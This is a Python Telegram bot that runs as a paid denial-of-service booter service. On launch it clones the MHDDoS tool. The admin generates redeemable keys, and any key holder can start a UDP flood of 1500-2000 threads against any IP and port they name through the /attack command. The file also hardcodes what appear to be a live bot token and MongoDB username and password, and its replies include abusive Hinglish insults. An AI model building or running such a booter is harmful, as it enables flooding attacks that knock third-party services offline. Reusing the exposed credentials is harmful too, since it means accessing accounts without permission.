import telebot
import subprocess
import threading
import time
import random
import os
from telebot import types
from datetime import datetime, timedelta
from pymongo import MongoClient

# --- CONFIG ---
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
# Maine isme +srv hata kar simple link dala hai jo DNS error nahi dega
MONGO_URL = "mongodb://riderbhai:riderbhai321@cluster0-shard-00-00.yvrweuu.mongodb.net:27017/RiderBot?ssl=true&authSource=admin&retryWrites=true&w=majority"
ADMIN_ID = 6075779781 
bot = telebot.TeleBot(TOKEN)

# --- MONGODB CONNECTION ---
try:
    # timeout badha diya hai taaki connection araam se ho
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=30000)
    db = client['RiderBot']
    users_col = db['users']
    keys_col = db['keys']
    client.admin.command('ping')
    print("✅ MongoDB Connected Successfully!")
except Exception as e:
    print(f"❌ Connection Error: {e}")

# --- ENGINE SETUP ---
if not os.path.exists("MHDDoS"):
    os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")

# --- PROGRESS BAR ---
def get_progress_bar(percent):
    bar_length = 10
    filled = int(percent / 10)
    return "🔥" * filled + "🌑" * (bar_length - filled)

# --- ATTACK LOGIC ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    threads = random.randint(1500, 2000)
    command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
    try:
        process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = int(duration - elapsed)
            percent = min(100, int((elapsed / duration) * 100))
            bar = get_progress_bar(percent)
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                    text=(f"🚀 **VVIP ATTACK ACTIVE** 🚀\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"👤 **Attacker:** `@{username}`\n"
                          f"🎯 **Target:** `{ip}:{port}`\n"
                          f"⏳ **Remaining:** `{remaining}s` / `{duration}s`\n"
                          f"📊 **Power:** `{bar} {percent}%` \n"
                          f"🛡️ **System:** `BYPASSING CLOUD... ✅` \n"
                          f"━━━━━━━━━━━━━━━━━━━━━━"), parse_mode="Markdown")
            except: pass
            time.sleep(5)
        process.terminate()
        bot.send_message(chat_id, f"✅ **SUCCESS!** Target `{ip}` hit. 🔥")
    except: pass

# --- HANDLERS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🚀 Start VVIP Attack', '👤 My Profile', '🔑 Redeem Key')
    return markup

@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    is_valid = (user_id == ADMIN_ID) or (user_data and datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now())
    
    if is_valid:
        bot.send_message(m.chat.id, f"💀 **Welcome Boss @{m.from_user.username}!**", reply_markup=main_menu())
    else:
        bot.send_message(m.chat.id, "🚫 **ACCESS DENIED, CHUTIYE!**\nContact @FLEXOP01 for Key. 🖕")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        days = int(m.text.split()[1])
        key = f"RIDER-{random.randint(1000, 9999)}"
        keys_col.insert_one({"key": key, "days": days})
        bot.send_message(m.chat.id, f"🔑 **VVIP KEY CREATED**\n\nClick to Copy:\n`/redeem {key}`\n\n**Validity:** {days} Days")
    except: bot.reply_to(m, "Format: `/genkey 1`")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    try:
        key_text = m.text.split()[1]
        key_data = keys_col.find_one({"key": key_text})
        if key_data:
            expiry = datetime.now() + timedelta(days=key_data['days'])
            users_col.update_one({"user_id": m.from_user.id}, {"$set": {"expiry": expiry.strftime('%Y-%m-%d %H:%M:%S')}}, upsert=True)
            keys_col.delete_one({"key": key_text})
            bot.reply_to(m, "🎉 **ACCESS GRANTED!** Use `/attack IP PORT TIME`", reply_markup=main_menu())
        else: bot.reply_to(m, "❌ Invalid Key!")
    except: pass

@bot.message_handler(func=lambda m: m.text == '🚀 Start VVIP Attack')
def guide(m):
    bot.reply_to(m, "🚀 **Attack Command:**\n`/attack IP PORT TIME` \n\nExample: `/attack 1.1.1.1 80 60`")

@bot.message_handler(func=lambda m: m.text == '👤 My Profile')
def profile(m):
    user_data = users_col.find_one({"user_id": m.from_user.id})
    status = f"Active Until: {user_data['expiry']}" if user_data else "No Access"
    bot.send_message(m.chat.id, f"👤 **PROFILE**\n🆔 ID: `{m.from_user.id}`\n📊 Status: {status}")

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    is_auth = (user_id == ADMIN_ID) or (user_data and datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now())
    if is_auth:
        try:
            p = m.text.split()
            sent = bot.reply_to(m, "📡 **CRACKING SERVER... ⚡**")
            threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
        except: bot.reply_to(m, "Format: `/attack IP PORT TIME`")
    else: bot.reply_to(m, "❌ Pehle Key dalo!")

print("🚀 Bot is Online!")
bot.infinity_polling()
            
